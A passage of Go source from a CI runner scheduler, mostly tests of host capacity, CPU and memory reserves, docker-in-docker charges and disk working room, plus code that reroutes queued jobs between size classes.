	if !strings.Contains(b.what, "too small for this pool's limits") {
		t.Errorf("the reason does not say the machine is too small: %q", b.what)
	}
	if b.atCapacity {
		t.Error("a host too small for the pool was reported as merely busy")
	}
	if !strings.Contains(b.fix, "lower this pool's") {
		t.Errorf("the fix does not name the pool's own limits: %q", b.fix)
	}
}

// The other half of that distinction: a host large enough for the pool that
// has already promised its memory away is short of memory, not too small, and
// waiting is exactly the right advice.
func TestAHostWhoseMemoryIsSpentSaysItIsShortOfMemory(t *testing.T) {
	p := limited("big", 0, 6*1024)
	h := sized("host_a", 8, 16, 8*1024+store.MinHostReserveMemoryMB, 200*1024)
	h.ActiveRunners = 1
	runners := map[string][]*store.Runner{p.ID: {onHost(testRunner("r1", p, store.RunnerBusy, 0), "host_a")}}

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, runners, now)
	b := hs.why(p)
	if !strings.Contains(b.what, "short of memory") {
		t.Errorf("the reason does not name memory: %q", b.what)
	}
	if strings.Contains(b.what, "too small") {
		t.Errorf("a host that fits the pool was called too small: %q", b.what)
	}
}

// HostCanRun is the one placement rule, so the wizard's count, the
// capacity-demand signal and image prewarming inherit the fit without asking
// for it. A host that cannot hold one runner of the pool is not a host that
// can run it, whatever else is true of it.
func TestHostCanRunAsksWhetherARunnerFits(t *testing.T) {
	small := sized("host_small", 4, 2, 2*1024, 200*1024)
	big := sized("host_big", 4, 16, 32*1024, 200*1024)
	p := limited("huge", 0, 16*1024)

	if HostCanRun(small, p, now) {
		t.Error("a host with 2 GB was offered a pool that reserves 16")
	}
	if !HostCanRun(big, p, now) {
		t.Error("a host with 32 GB was refused a pool that reserves 16")
	}
}

// The reserve is the operator's, and an agent reports what it sees rather than
// what it may have: memory an operator held back for the machine is not
// memory the fleet may promise to a job.
func TestTheOperatorsReserveIsHeldBackFromPlacement(t *testing.T) {
	p := limited("big", 0, 4096)
	h := sized("host_a", 8, 16, 12*1024, 200*1024)
	h.ReserveMemoryMB = 8 * 1024

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 3); len(got) != 1 {
		t.Fatalf("placed %d runners in the 4 GB left after an 8 GB reserve, want 1: %v", len(got), got)
	}
}

// onHost puts a test runner somewhere other than the helper's default host.
func onHost(r *store.Runner, hostID string) *store.Runner {
	r.HostID = hostID
	return r
}

// The case that sent an operator to this function: the wizard's placement step
// counts two Linux amd64 hosts, its review step counts one, and the 12-CPU
// machine is the one that vanished -- because docker-in-docker charges its
// sidecar too, so an 8-CPU pool costs 16 and the "8 CPU" on the pool is not a
// number anything on screen can be compared against.
func TestTheShortfallNamesTheDoubledDockerInDockerCharge(t *testing.T) {
	// 40 GB across the 8 slots, so the memory the pool leaves to the host clears the floor a
	// pair is refused under; the point here is the CPU charge.
	h := sized("host_a", 8, 12, 40*1024, 500*1024)
	p := limited("builders", 8, 0)
	p.DockerMode = store.DockerDinD

	// 11.4 rather than 12: the floor under the CPU reserve keeps a
	// twentieth of the machine for the daemon, and the shortfall names what
	// may actually be placed on, which is the figure the pass fits against.
	got := HostShortfall(h, p)
	for _, want := range []string{"11.4 CPU", "charged 16", "sidecar"} {
		if !strings.Contains(got, want) {
			t.Errorf("HostShortfall = %q, want it to mention %q", got, want)
		}
	}
	// The same pool without the sidecar fits the same machine, which is what
	// makes the doubling worth naming rather than describing as a limit.
	p.DockerMode = store.DockerNone
	if got := HostShortfall(h, p); got != "" {
		t.Errorf("HostShortfall = %q for a pool that fits", got)
	}
}

// A host that never measured itself constrains nothing, so it is placed by its
// slot count alone. That is deliberate -- it is what stops an upgrade emptying
// a fleet -- and the shortfall has to agree with it, or the wizard would name a
// size problem the scheduler does not have.
func TestAnUnmeasuredHostHasNoShortfall(t *testing.T) {
	h := testHost("host_a", 6, 0)
	p := limited("builders", 64, 512*1024)

	if got := HostShortfall(h, p); got != "" {
		t.Errorf("HostShortfall = %q for a host that has reported no size", got)
	}
}

// Disk is the dimension with no fallback and its own floor, so a pool that asks
// for more of it than a host has left is refused in the host's terms rather
// than in the pool's.
func TestTheShortfallNamesTheDiskAPoolAskedFor(t *testing.T) {
	h := sized("host_a", 8, 8, 32*1024, 40*1024)
	p := limited("archivers", 0, 0)
	p.Resources = store.Resources{DiskGB: 200}

	got := HostShortfall(h, p)
	if !strings.Contains(got, "disk") || !strings.Contains(got, "charged 200 GB") {
		t.Errorf("HostShortfall = %q, want the disk the pool asked for", got)
	}
}

// A host cut into more slots than it has runners' worth of room cannot back a
// pool that leaves its size to the host.
//
// The two halves of sizing are checked in different places, and this is what
// keeps them agreeing. A figure an operator types is refused below a quarter
// of a core; the share a host hands out was not checked at all, so a 32-slot
// capacity on an eight-core machine gave every runner 0.23 of a core -- which
// the same operator would have been refused for typing, and which the runner
// binary cannot keep up with.
//
// It is answered by refusing the host rather than by rounding the share up.
// Rounding up is over-provisioning by another name: the slots are meant to add
// up to the machine, and a floor applied to each of them adds up to more than
// there is.
func TestAHostCutTooFineCannotBackAnAutomaticPool(t *testing.T) {
	automatic := &store.Pool{Name: "zoomies-auto"}

	// Eight cores, 32 slots. Allocatable is 8 - max(0.5, 0.4) = 7.5, so each
	// slot is 0.23 -- under the floor.
	tooFine := &store.Host{
		Name: "sliced-1", Capacity: 32, CPUs: 8, MemoryMB: 65536,
	}
	if field := ShareTooSmall(tooFine, automatic); field != "cpu" {
		t.Errorf("ShareTooSmall = %q, want cpu: 32 slots on eight cores is 0.23 each", field)
	}
	if HostFits(tooFine, automatic) {
		t.Error("a host handing out 0.23 of a core per runner was accepted")
	}
	why := HostShortfall(tooFine, automatic)
	if !strings.Contains(why, "slot") || !strings.Contains(why, "0.23") {
		t.Errorf("the shortfall does not say the slot count is the cause: %q", why)
	}
	// The room agrees with the placement, or the page promises slots the pass
	// refuses.
	if room := HostRoomFor(tooFine, automatic); room.Room != 0 || room.LimitedBy != "cpu" {
		t.Errorf("room = %+v, want none, limited by cpu", room)
	}

	// The same machine at four slots is 1.87 each, which is fine.
	sensible := &store.Host{Name: "sliced-1", Capacity: 4, CPUs: 8, MemoryMB: 65536}
	if field := ShareTooSmall(sensible, automatic); field != "" {
		t.Errorf("ShareTooSmall = %q on a host handing out 1.87 of a core, want none", field)
	}
	if !HostFits(sensible, automatic) {
		t.Error("a host handing out 1.87 of a core per runner was refused")
	}

	// Memory answers for itself: 64 slots on 32 GB is 512 MB each, and 128 is
	// 256 -- under the floor with CPU to spare.
	thin := &store.Host{Name: "thin-1", Capacity: 128, CPUs: 128, MemoryMB: 32768}
	if field := ShareTooSmall(thin, automatic); field != "memory" {
		t.Errorf("ShareTooSmall = %q, want memory", field)
	}

	// A pool that names its own size answers for it at the API, so the share
	// is not its question and the floor is not applied to it here.
	fixed := &store.Pool{Name: "zoomies-fixed", Resources: store.Resources{CPUs: 2, MemoryMB: 4096}}
	if field := ShareTooSmall(tooFine, fixed); field != "" {
		t.Errorf("ShareTooSmall = %q for a pool that sets its own size, want none", field)
	}

	// A host that has measured nothing is placed by slots alone, exactly as it
	// was before any of this existed. Refusing it would empty a fleet the
	// moment it upgraded.
	unmeasured := &store.Host{Name: "old-1", Capacity: 32}
	if field := ShareTooSmall(unmeasured, automatic); field != "" {
		t.Errorf("ShareTooSmall = %q on a host that has measured nothing, want none", field)
	}
	if !HostFits(unmeasured, automatic) {
		t.Error("a host that has measured nothing was refused")
	}
}

// A runner is given its size once, and the host is charged for what it was given.
// An operator who gives a host's runners less -- which is what a suggestion for a
// host that holds fewer runners than its capacity proposes, made while work is
// running -- must not see the runners already there charged the new, smaller size:
// the host would look mostly free and the next pass would place work on top of
// runners still holding the old, larger one.
func TestARunnerIsNeverChargedLessThanItWasCreatedWith(t *testing.T) {
	h := bigHost("big")
	p := profilePool("builders", 0, 0)
	r := &store.Runner{AllocationSource: store.AllocationFromProfile, AllocatedCPUs: 3, AllocatedMemoryMB: 8 * 1024}
	if got := RunnerGuarantee(p, h, r); got.CPUs != 3 || got.MemoryMB != 8*1024 {
		t.Fatalf("a runner at the standard is charged %+v", got)
	}

	h.RunnerProfile = store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 1, MemoryMB: 2 * 1024}}
	got := RunnerGuarantee(p, h, r)
	if got.CPUs != 3 || got.MemoryMB != 8*1024 {
		t.Errorf("after the standard was lowered the live runner is charged %+v, want what it was created with", got)
	}

	// A runner with no figures on its row has nothing to say and takes the standard.
	if got := RunnerGuarantee(p, h, &store.Runner{AllocationSource: store.AllocationFromProfile}); got.CPUs != 1 || got.MemoryMB != 2*1024 {
		t.Errorf("a row with no figures is charged %+v, want the standard", got)
	}

	// Raising the standard still raises the charge: the larger figure wins.
	h.RunnerProfile = store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 4, MemoryMB: 10 * 1024}}
	if got := RunnerGuarantee(p, h, r); got.CPUs != 4 || got.MemoryMB != 10*1024 {
		t.Errorf("after the standard was raised the runner is charged %+v, want the larger", got)
	}
}

// An automatic pool has no limit of its own to lower, so the refusal that says each slot is
// too thin has to say what to set: the capacity at which a slot covers the floor. Without it
// an operator who switched a pool to docker-in-docker on a default-capacity host was left to
// find the number by trying. The figure named must be one that works.
func TestARefusedShareNamesTheCapacityThatFits(t *testing.T) {
	h := sized("host_default", 4, 8, 16*1024, 500*1024)
	p := testPool("builders", "builders")
	p.DockerMode = store.DockerDinD
	if ShareTooSmall(h, p) == "" {
		t.Fatal("the fixture must be refused for the test to mean anything")
	}
	why := HostShortfall(h, p)
	if !strings.Contains(why, "lower the host's capacity to ") {
		t.Fatalf("HostShortfall = %q, want it to name a capacity", why)
	}
	var n int
	if _, err := fmt.Sscanf(why[strings.Index(why, "capacity to ")+len("capacity to "):], "%d", &n); err != nil || n < 1 || n >= h.Slots() {
		t.Fatalf("capacity named in %q is not a lower, positive figure (%d, %v)", why, n, err)
	}
	h.Capacity = n
	if got := ShareTooSmall(h, p); got != "" {
		t.Errorf("at the named capacity %d the host is still refused (%s)", n, got)
	}
	if !HostFits(h, p) {
		t.Errorf("at the named capacity %d one runner of the pool still does not fit", n)
	}

	// A host whose whole allocatable cannot cover one slot is told nothing to set.
	tiny := sized("host_tiny", 1, 2, 4*1024, 500*1024)
	if strings.Contains(HostShortfall(tiny, p), "lower the host's capacity") {
		t.Errorf("a host at one slot was told to lower its capacity: %q", HostShortfall(tiny, p))
	}
}

// A pool that types one field and leaves the other to the host still has a field the host
// decided, and a pair on it is judged like an automatic pool's: refused when each slot
// divides to less than a runner and a daemon each need, and told the capacity that fits.
// It was passed untouched, so 0.5 CPU typed beside a memory share of 240 MB ran on a machine
// that would have refused the same pool left entirely to the host.
func TestAPoolThatTypesOneFieldIsRefusedWhereTheOtherIsTooThinForAPair(t *testing.T) {
	// 8 slots on 16 GB: the memory share is under the 4 GB a pair needs; the typed CPU is fine.
	h := sized("host_a", 8, 64, 16*1024, 500*1024)
	p := limited("builders", 4, 0)
	p.DockerMode = store.DockerDinD
	if field := ShareTooSmall(h, p); field != "memory" {
		t.Fatalf("ShareTooSmall = %q, want memory: the host-decided field is below a pair's floor", field)
	}
	if HostFits(h, p) {
		t.Error("a pool whose host-decided memory cannot be divided between a pair was accepted")
	}
	if why := HostShortfall(h, p); !strings.Contains(why, "lower the host's capacity to ") {
		t.Errorf("the refusal must name the capacity that fits: %q", why)
	}

	// Typed on both fields it answers for itself, as it always did.
	both := limited("both", 4, 4096)
	both.DockerMode = store.DockerDinD
	if field := ShareTooSmall(h, both); field != "" {
		t.Errorf("a pool that typed both fields was refused for a share it was not given: %q", field)
	}

	// And the same pool on a host whose slots are wide enough is not refused.
	wide := sized("host_b", 2, 64, 32*1024, 500*1024)
	if field := ShareTooSmall(wide, p); field != "" {
		t.Errorf("a roomy host was refused: %q", field)
	}
}

// A pool that says nothing about disk used to be charged nothing, so one
// runner could start on a machine with 3 GB free and fill it part-way through
// its first download. Three CI jobs died that way on fresh machines.
func TestAPoolThatTypesNoDiskIsChargedAWorkingRoom(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, 200*1024)
	if got := Reserve(testPool("plain", "plain"), h).DiskMB; got != RunnerDiskMB {
		t.Fatalf("charged %d MB, want the working room %d", got, RunnerDiskMB)
	}
}

func TestADockerInDockerPairSharesOneWorkingRoom(t *testing.T) {
	p := testPool("dind", "dind")
	p.DockerMode = store.DockerDinD
	if got := Reserve(p, sized("host", 4, 16, 16*1024, 200*1024)).DiskMB; got != RunnerDiskMB {
		t.Fatalf("charged %d MB, want one room %d: only a typed figure doubles", got, RunnerDiskMB)
	}
}

func TestATypedDiskFigureWinsOverTheWorkingRoom(t *testing.T) {
	p := testPool("small", "small")
	p.Resources.DiskGB = 1
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+2048) // 2 GB to place on
	if got := Reserve(p, h).DiskMB; got != 1024 {
		t.Fatalf("charged %d MB, want the 1024 the pool typed", got)
	}
	if !HostFits(h, p) {
		t.Fatal("a pool that asks for 1 GB does not fit a host with 2 GB to place on")
	}
}

func TestAnUnmeasuredDiskConstrainsNothing(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, 0)
	h.DiskTotalMB, h.DiskFreeMB = 0, 0
	if !HostFits(h, testPool("plain", "plain")) {
		t.Fatal("a host that never measured its disk must place by slots alone")
	}
}

// Each runner a pass adds is charged its room against what is free.
func TestAPassChargesEachRunnerItAddsAWorkingRoom(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+RunnerDiskMB+1024) // room for one
	hs := newHostSet([]*store.Host{h}, []*store.Pool{testPool("plain", "plain")}, nil, now)
	if got := len(hs.place(testPool("plain", "plain"), 3)); got != 1 {
		t.Fatalf("placed %d runners on a host with room for one", got)
	}
}

// Free disk measures what has been written, not what was promised. A runner
// placed last pass has written nothing yet, so a pass that started from the
// measurement alone would place a second runner in the same room and the host
// would run out part-way through both jobs, which is the failure the room
// exists to prevent.
func TestARunnerPlacedLastPassStillHoldsItsWorkingRoom(t *testing.T) {
	p := testPool("plain", "plain")
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+RunnerDiskMB+1024) // room for one
	live := map[string][]*store.Runner{p.ID: {{ID: "run_1", PoolID: p.ID, HostID: h.ID, State: store.RunnerIdle}}}
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, live, now)
	if got := len(hs.place(p, 3)); got != 0 {
		t.Fatalf("placed %d runners beside one that holds the only room", got)
	}
	// Once it is gone the room is free again, and a measurement that has not
	// moved is believed.
	hs = newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := len(hs.place(p, 3)); got != 1 {
		t.Fatalf("placed %d runners on a host with room for one", got)
	}
}

// A host that never measured its disk charges nothing for it, so a live
// runner's room must not turn its unknown into a negative that reads as full.
func TestALiveRunnersRoomDoesNotConstrainAnUnmeasuredHost(t *testing.T) {
	p := testPool("plain", "plain")
	h := sized("host", 4, 16, 16*1024, 0)
	h.DiskTotalMB, h.DiskFreeMB = 0, 0
	live := map[string][]*store.Runner{p.ID: {{ID: "run_1", PoolID: p.ID, HostID: h.ID, State: store.RunnerIdle}}}
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, live, now)
	if got := len(hs.place(p, 1)); got != 1 {
		t.Fatalf("placed %d runners on an unmeasured host with a slot free", got)
	}
}

func TestTheLowOnDiskFixNamesTheWorkingRoom(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+1024)
	p := testPool("plain", "plain")
	b := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now).why(p)
	if !strings.Contains(b.what, "low on disk") {
		t.Errorf("a host with a few GB free is short of disk, not too small: %q", b.what)
	}
	for _, want := range []string{"free space", "10 GB", "disk_gb"} {
		if !strings.Contains(b.fix, want) {
			t.Errorf("the fix %q does not say %q", b.fix, want)
		}
	}
}

// A pool that typed its disk is charged what it typed, not the working room,
// so telling its operator to type a figure below 10 GB is advice about a
// default they are not using; the figure to lower is their own.
func TestTheLowOnDiskFixForATypedDiskNamesThePoolsOwnFigure(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+1024)
	p := testPool("typed", "typed")
	p.Resources.DiskGB = 8
	b := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now).why(p)
	if !strings.Contains(b.what, "low on disk") {
		t.Fatalf("a host with a few GB free is short of disk, not too small: %q", b.what)
	}
	if !strings.Contains(b.fix, "lower the pool's resources.disk_gb") {
		t.Errorf("the fix %q does not say to lower the pool's own figure", b.fix)
	}
	if strings.Contains(b.fix, "10 GB") {
		t.Errorf("the fix %q names the working room the pool does not use", b.fix)
	}
}

// The same answer once a runner of this pass has used up the room the host
// had, which is the other way to arrive at the low-on-disk branch.
func TestAHostWhoseRoomThisPassUsedUpIsLowOnDiskToo(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+RunnerDiskMB+1024)
	p := testPool("plain", "plain")
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	hs.place(p, 1)
	b := hs.why(p)
	if !strings.Contains(b.what, "low on disk") || !strings.Contains(b.fix, "free space") {
		t.Errorf("what %q, fix %q: want the low-on-disk answer", b.what, b.fix)
	}
}

// Without the sentence, "is charged 10 GB" reads as something the pool asked
// for, and the operator has no way to know that typing disk_gb lowers it.
func TestTheDiskShortfallSaysWhereAnUntypedChargeCameFrom(t *testing.T) {
	h := sized("host", 4, 16, 16*1024, store.MinHostReserveDiskMB+1024)
	got := HostShortfall(h, testPool("plain", "plain"))
	if !strings.Contains(got, "working room") || !strings.Contains(got, "resources.disk_gb") {
		t.Errorf("the shortfall does not explain the default charge: %q", got)
	}
	typed := testPool("typed", "typed")
	typed.Resources.DiskGB = 8
	if got := HostShortfall(h, typed); strings.Contains(got, "working room") {
		t.Errorf("a pool that typed its disk is told about a default it did not use: %q", got)
	}
}

package scheduler

import (
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// The room is the machine, not the slot count -- and where the two disagree,
// which one wins is the whole answer.
//
// A host set to more slots than its machine can back is the failure that looks
// like health: the free slots are counted on every page, and every create for
// one of them is refused for want of memory. A host set to fewer is an
// operator's own ceiling and is honoured as one.
func TestHostRoomIsTheSmallerOfTheMachineAndTheSlots(t *testing.T) {
	tests := []struct {
		name      string
		host      *store.Host
		pool      *store.Pool
		wantFits  int
		wantRoom  int
		wantLimit string
	}{
		{
			name: "the machine runs out first",
			// Ten cores less the half-core floor is 9.5, which is four
			// two-core runners; twenty gigabytes less 512 MB is four more.
			host:      sized("host_a", 8, 10, 20*1024, 500*1024),
			pool:      limited("standard", 2, 4096),
			wantFits:  4,
			wantRoom:  4,
			wantLimit: "cpu",
		},
		{
			name:      "the operator's ceiling is lower and is honoured",
			host:      sized("host_b", 2, 10, 20*1024, 500*1024),
			pool:      limited("standard", 2, 4096),
			wantFits:  4,
			wantRoom:  2,
			wantLimit: "slots",
		},
		{
			name:      "memory is the tighter of the two",
			host:      sized("host_c", 8, 16, 8*1024+store.MinHostReserveMemoryMB, 500*1024),
			pool:      limited("hungry", 1, 4096),
			wantFits:  2,
			wantRoom:  2,
			wantLimit: "memory",
		},
		{
			name: "a machine too small for one runner has room for none",
			host: sized("host_d", 4, 2, 2*1024, 500*1024),
			pool: limited("huge", 8, 16384),
			// Not a negative, and not the slot count either: a host that
			// cannot hold one is a host with no room, and the count has to
			// say so rather than promising four.
			wantFits:  0,
			wantRoom:  0,
			wantLimit: "cpu",
		},
		{
			// The pass refuses every runner on a host at its disk reserve,
			// however little the pool asks for, so a pool that states no disk
			// must not be told the host has room. The pool page and the
			// pool.max_above_room warning add these figures up.
			name: "a host at its disk reserve has room for none, whatever the pool asks for",
			host: func() *store.Host {
				h := sized("host_e", 4, 8, 32*1024, 500*1024)
				h.DiskFreeMB = 0
				return h
			}(),
			pool:      limited("light", 1, 1024),
			wantFits:  0,
			wantRoom:  0,
			wantLimit: "disk",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := HostRoomFor(tc.host, tc.pool)
			if got.Fits != tc.wantFits || got.Room != tc.wantRoom || got.LimitedBy != tc.wantLimit {
				t.Errorf("HostRoomFor = %+v, want fits %d, room %d, limited by %s",
					got, tc.wantFits, tc.wantRoom, tc.wantLimit)
			}
		})
	}
}

// A docker-in-docker slot is two containers, so the room it leaves is half what
// the pool's own figures suggest. An operator reading "2 CPU" against a ten-core
// host and being told there is room for two has to be told why, and this is the
// arithmetic the sentence comes from.
func TestARunnerWithASidecarTakesTwiceTheRoom(t *testing.T) {
	h := sized("host_a", 8, 10, 20*1024, 500*1024)
	p := limited("dind", 2, 4096)
	p.DockerMode = store.DockerDinD

	got := HostRoomFor(h, p)
	if got.Fits != 2 {
		t.Errorf("fits = %d, want 2: the pair is charged 4 CPU and 8 GB on a machine with 9.5 and 19.5", got.Fits)
	}
}

// A host that has measured nothing places by its slots alone, exactly as it did
// before any of this existed -- which is what stops an upgrade emptying a fleet
// of agents too old to report their machines.
func TestAnUnmeasuredHostPlacesBySlots(t *testing.T) {
	h := testHost("host_old", 6, 0)
	p := limited("standard", 2, 4096)

	got := HostRoomFor(h, p)
	if got.Room != 6 || got.LimitedBy != "" {
		t.Errorf("HostRoomFor = %+v, want all six slots and nothing named as the limit", got)
	}
}

package scheduler

import (
	"fmt"
	"slices"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// AtQueue is the class a job joins the queue in, before anyone has looked at
// what it did last time: a size label in its runs-on, an operator's pin, the
// class kept from its earlier runs, or the default class.
//
// It does not look at the runs. That is done when a job finishes, and the
// result is kept; reading the kept class when the next one arrives is what makes
// classifying a job at the door a lookup and not a query over its history.
func (c SizeConfig) AtQueue(labels []string, pin *store.SizePin, kept *store.JobClass) Classification {
	if out, ok := c.authority(labels, pin); ok {
		return out
	}
	if kept != nil && kept.Class.Valid() {
		basis := kept.Basis
		if basis == "" {
			basis = store.SizeBasisHistory
		}
		return Classification{Class: kept.Class, Basis: basis, Reason: kept.Reason, FloorMB: kept.FloorMB, Runs: kept.Runs}
	}
	def := c.defaultClass()
	return Classification{Class: def, Basis: store.SizeBasisDefault,
		Reason: fmt.Sprintf("it has no measured runs yet, so it starts in the default class, %s", def)}
}

// Reroute is a queued job sent to a different class from the one it was routed
// to, and why.
type Reroute struct {
	Job      *store.Job
	From, To store.SizeClass
	// Note is the sentence kept on the job, which the Jobs page shows beside
	// where it ran.
	Note string
}

// RoutingInput is what Fallbacks decides from: the same fleet Decide was given
// and the plan it made of it.
type RoutingInput struct {
	Now   time.Time
	Pools []*store.Pool
	Hosts []*store.Host
	// Jobs is every job, of which only the queued ones matter.
	Jobs   []*store.Job
	Plan   Plan
	Config SizeConfig
	// Size is the same hook PlanAutoPools takes: a pool as the scheduler sizes
	// it, where the settings decide part of that.
	Size func(*store.Pool) *store.Pool
}

// classOrder is the order a job of class c is offered the classes in: its own,
// then each larger one, then each smaller one, nearest first. Larger comes
// before smaller because a larger host always has what the job needs, and a
// smaller one only sometimes does.
func classOrder(c store.SizeClass) []store.SizeClass {
	all := store.SizeClasses()
	out := []store.SizeClass{c}
	for _, k := range all {
		if k.Rank() > c.Rank() {
			out = append(out, k)
		}
	}
	for i := len(all) - 1; i >= 0; i-- {
		if all[i].Rank() < c.Rank() {
			out = append(out, all[i])
		}
	}
	return out
}

// Fallbacks decides which queued jobs should be sent to a class other than the
// one they are routed to, and where.
//
// A job whose class has no pool at all -- no host of that class is enrolled --
// is moved at once. A job whose class has a pool with no room is moved once it
// has waited the configured time and is among the jobs that pool has no runner
// for. It goes to the first class in its order that shows room for it, so it is
// not sent to a pool that cannot start it either, and only a job that has no
// runner coming is ever moved: one that has been sent somewhere and is being
// served stays, so two classes that are both short of room do not pass a job
// between them.
//
// A job that asked for a class by name is never moved: that is the guaranteed
// path, and it is the author's to change. A job nobody has classed has nothing
// to be moved from. A class smaller than the job's is used only when its runners
// hold what the job is known to need, except where the job's class has no pool
// and nothing larger does either, when the nearest smaller class is used anyway
// and the note says it may be too small: a job waiting for a host that does not
// exist waits for ever, and one that runs and is killed for memory says why.
func Fallbacks(in RoutingInput) []Reroute {
	pools := sortedPools(in.Pools)
	size := in.Size
	if size == nil {
		size = func(p *store.Pool) *store.Pool { return p }
	}
	demand, _ := assign(pools, in.Jobs, nil)

	plans := make(map[string]*PoolPlan, len(in.Plan.Pools))
	for i := range in.Plan.Pools {
		plans[in.Plan.Pools[i].PoolID] = &in.Plan.Pools[i]
	}
	moved := map[string]int{}
	var out []Reroute

	// spare is the runners a pool can still start for jobs sent to it.
	spare := func(p *store.Pool) int {
		pp := plans[p.ID]
		if pp == nil || pp.Blocked != "" || pp.BlockedNoEligibleHost || pp.Failing != "" || pp.Held != "" {
			return 0
		}
		return max(0, p.MaxRunners-(pp.Current+creates(pp.Actions))) - pp.Unserved - moved[p.ID]
	}

	// poolsFor are the enabled automatic pools of a class that could run the job.
	poolsFor := func(class store.SizeClass, j *store.Job) []*store.Pool {
		var found []*store.Pool
		for _, p := range pools {
			if servesClass(p, class) {
				if ok, _ := Eligible(p, j); ok {
					found = append(found, p)
				}
			}
		}
		return found
	}

	// landsIn is the pool a job would be given if it were routed to class: the
	// one the claim itself picks among the pools that serve the class and could
	// run the job. Any other choice -- the first by name, say -- checks the room
	// of one pool and then sends the job to another, which a fleet with a pool for
	// each architecture of a class has.
	landsIn := func(class store.SizeClass, j *store.Job) *store.Pool {
		routed := *j
		routed.RoutedClass = class
		return BestPool(poolsFor(class, j), &routed)
	}

	// holds reports whether a runner of the pool the job would land in has at
	// least mb of memory.
	holds := func(class store.SizeClass, j *store.Job, mb int64) bool {
		p := landsIn(class, j)
		if p == nil {
			return false
		}
		sized := size(p)
		for _, h := range in.Hosts {
			if k, _ := h.EffectiveSizeClass(); k != class || !HostAvailable(h, in.Now) || !HostOffers(h, p) {
				continue
			}
			if slotSize(sized, h).MemoryMB >= mb {
				return true
			}
		}
		return false
	}

	move := func(j *store.Job, from, to store.SizeClass, note string) {
		out = append(out, Reroute{Job: j, From: from, To: to, Note: note})
	}

	for _, j := range sortedJobs(in.Jobs) {
		if j.State != store.JobQueued || j.Provisioning != "" || !j.SizeClass.Valid() || j.SizeBasis == store.SizeBasisExplicit {
			continue
		}
		need, routed := j.SizeClass, j.RoutedClass
		if !routed.Valid() {
			// Not routed: the controller is only watching, or has not got to
			// this job yet. There is nothing to move it from.
			continue
		}
		if len(poolsFor(routed, j)) > 0 {
			continue
		}
		// The class it is routed to has no pool, so no host will ever take it
		// there. Nothing is waited for.
		order := classOrder(need)
		var pick store.SizeClass
		var smallerNote bool
		for _, k := range order {
			if k == routed || len(poolsFor(k, j)) == 0 {
				continue
			}
			if k.Rank() < need.Rank() && !(j.SizeFloorMB > 0 && holds(k, j, j.SizeFloorMB)) {
				continue
			}
			pick = k
			break
		}
		if pick == "" {
			// Nothing larger, nothing smaller that is known to hold it: the
			// nearest smaller class with a pool, because the alternative is a
			// job that never starts.
			for _, k := range order {
				if k.Rank() < need.Rank() && len(poolsFor(k, j)) > 0 {
					pick, smallerNote = k, true
					break
				}
			}
		}
		if pick == "" {
			continue
		}
		move(j, routed, pick, noPoolNote(routed, pick, j, smallerNote))
		moved[landsIn(pick, j).ID]++
	}

	for _, p := range pools {
		pp := plans[p.ID]
		if !servesAnyClass(p) || pp == nil || pp.Unserved <= 0 {
			continue
		}
		queued := demand[p.ID]
		// The runners that exist or are being made go to the oldest jobs. The
		// jobs left over are the youngest of those that drove the pool's demand.
		served := max(0, pp.eligible-pp.Unserved)
		if served >= len(queued) {
			continue
		}
		for _, j := range queued[served:min(pp.eligible, len(queued))] {
			if !j.SizeClass.Valid() || !j.RoutedClass.Valid() || j.SizeBasis == store.SizeBasisExplicit ||
				slices.ContainsFunc(out, func(r Reroute) bool { return r.Job == j }) {
				continue
			}
			waited := in.Now.Sub(waitingSince(j))
			if waited < in.Config.FallbackWait {
				continue
			}
			for _, k := range classOrder(j.SizeClass) {
				if k == j.RoutedClass || (k.Rank() < j.SizeClass.Rank() && !(j.SizeFloorMB > 0 && holds(k, j, j.SizeFloorMB))) {
					continue
				}
				// Room is asked of the pool the job would really land in, not of
				// whichever pool of the class has some: the claim does not look
				// at room when it chooses.
				target := landsIn(k, j)
				if target == nil || spare(target) <= 0 {
					continue
				}
				moved[target.ID]++
				move(j, j.RoutedClass, k, noRoomNote(j, k, waited))
				break
			}
		}
	}
	return out
}

// waitingSince is when a job became something the fleet could act on.
func waitingSince(j *store.Job) time.Time {
	if j.EligibleAt != nil {
		return *j.EligibleAt
	}
	return j.QueuedAt
}

// noPoolNote is the sentence for a job sent on because its class has no pool.
func noPoolNote(from, to store.SizeClass, j *store.Job, below bool) string {
	switch {
	case below:
		return fmt.Sprintf("there is no %s pool and nothing larger, so it was sent to %s, which is smaller than it is known to need%s; add a %s host",
			from, to, needPhrase(j.SizeFloorMB), j.SizeClass)
	case to.Rank() < j.SizeClass.Rank():
		return fmt.Sprintf("there is no %s pool, so it was sent to %s: the memory it needs%s fits there", from, to, needPhrase(j.SizeFloorMB))
	}
	return fmt.Sprintf("there is no %s pool (no %s host is enrolled), so it was sent to %s, the next size up", from, from, to)
}

// noRoomNote is the sentence for a job sent on because the class it was in had
// no room for it for as long as the wait.
func noRoomNote(j *store.Job, to store.SizeClass, waited time.Duration) string {
	head := fmt.Sprintf("no %s host had room for it for %s, so it ", j.RoutedClass, formatDuration(waited.Round(time.Second)))
	switch {
	case to == j.SizeClass:
		return head + fmt.Sprintf("went back to %s, its own class, which has room", to)
	case to.Rank() < j.SizeClass.Rank():
		return head + fmt.Sprintf("was allowed on %s, which still holds the %s it needs", to, formatMB(j.SizeFloorMB))
	}
